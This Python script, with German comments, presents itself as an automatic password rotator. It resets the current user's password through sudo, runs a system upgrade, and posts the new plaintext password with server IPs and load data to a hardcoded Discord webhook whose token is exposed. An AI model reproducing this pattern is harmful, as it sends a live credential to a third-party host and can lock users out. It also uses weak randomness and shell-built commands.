
#!/usr/bin/env python3
import random
import string
import subprocess
import requests
import os
import json
import psutil
import socket
import time
from datetime import datetime, timedelta, timezone 

# Webhook-URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1344725474374455417/fk4cJk1lwTcke_62-aAepKvidAaEBeSLinCaIPQktf61C33hsww71n4Tzq0V61r8u1eM"

# Passwort generieren
def generate_password(length=30):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
    return ''.join(random.choice(chars) for _ in range(length))

# Passwort setzen
def change_password(username, password):
    cmd = f"echo '{username}:{password}' | sudo chpasswd"
    subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Systeminformationen abrufen
def get_system_info():
    # Öffentliche IP des Benutzers
    try:
        user_public_ip = requests.get("https://api64.ipify.org?format=json").json()["ip"]
    except:
        user_public_ip = "Nicht verfügbar"

    # Lokale IP-Adresse
    user_local_ip = socket.gethostbyname(socket.gethostname())

    # Öffentliche IP des Servers
    try:
        server_public_ip = requests.get("https://api64.ipify.org?format=json").json()["ip"]
    except:
        server_public_ip = "Nicht verfügbar"

    # Private IP des Servers
    server_private_ip = socket.gethostbyname(socket.gethostname())

    # CPU-Last
    load_1, load_5, load_15 = os.getloadavg()

    # CPU-Auslastung pro Kern
    cpu_cores = psutil.cpu_percent(percpu=True)

    # RAM-Info
    mem = psutil.virtual_memory()
    mem_total = round(mem.total / (1024**3), 2)  # GB
    mem_used = round(mem.used / (1024**3), 2)    # GB
    mem_free = round(mem.available / (1024**3), 2)  # GB

    # Server Uptime
    boot_time = psutil.boot_time()
    uptime_seconds = int(time.time() - boot_time)
    uptime = str(timedelta(seconds=uptime_seconds))  # timedelta jetzt korrekt

    return {
        "user_public_ip": user_public_ip,
        "user_local_ip": user_local_ip,
        "server_public_ip": server_public_ip,
        "server_private_ip": server_private_ip,
        "cpu_load": f"{load_1:.2f} (1min), {load_5:.2f} (5min), {load_15:.2f} (15min)",
        "cpu_cores": [f"Core {i}: {cpu}%" for i, cpu in enumerate(cpu_cores)],
        "memory": f"{mem_used}GB / {mem_total}GB (frei: {mem_free}GB)",
        "uptime": uptime
    }

# Passwort & Systeminfos an Discord senden
def send_to_discord(password, system_info):
    embed = {
        "title": "🔑 Neues Passwort gesetzt",
        "description": f"```{password}```",
        "color": 16711680,  # Rot (#FF0000)
        "author": {
            "name": "Made by Doloツ 💖",  # Author Name 
            "url": "https://dolo.de",  # Author-Link
            "icon_url": "https://i.pinimg.com/originals/cd/27/89/cd27894c74d2d0870e2bc7014049be3a.gif"  # Author-Bild
        },
        "thumbnail": {
            "url": "#"  # Thumbnail-Bild
        },
        "fields": [
            {"name": "🌍 Benutzer-IP (öffentlich)", "value": system_info["user_public_ip"], "inline": True},
            {"name": "🏠 Benutzer-IP (lokal)", "value": system_info["user_local_ip"], "inline": True},
            {"name": "🖥 Server-IP (öffentlich)", "value": system_info["server_public_ip"], "inline": True},
            {"name": "🖥 Server-IP (privat)", "value": system_info["server_private_ip"], "inline": True},
	        {"name": "⏳ Server Uptime", "value": system_info["uptime"], "inline": True},
            {"name": "⚡ System-Load", "value": system_info["cpu_load"], "inline": False},
            {"name": "💾 RAM-Nutzung", "value": system_info["memory"], "inline": False},
            {"name": "💻 CPU-Auslastung pro Kern", "value": "\n".join(system_info["cpu_cores"]), "inline": False},
        ],
        "footer": {"text": "Automatische Passwortänderung"},
        "timestamp": datetime.now(timezone.utc).isoformat()
    }

    data = {"embeds": [embed]}
    headers = {"Content-Type": "application/json"}
    
    requests.post(WEBHOOK_URL, json=data, headers=headers)

# System aktualisieren (apt update && apt upgrade -y)
def update_system():
    cmd = "sudo apt update && sudo apt upgrade -y"
    subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Hauptfunktion
def main():
    username = os.getlogin()  # Aktuellen Benutzer ermitteln
    new_password = generate_password()
    change_password(username, new_password)
    
    # System aktualisieren
    update_system()
    
    system_info = get_system_info()
    send_to_discord(new_password, system_info)

if __name__ == "__main__":
    main()
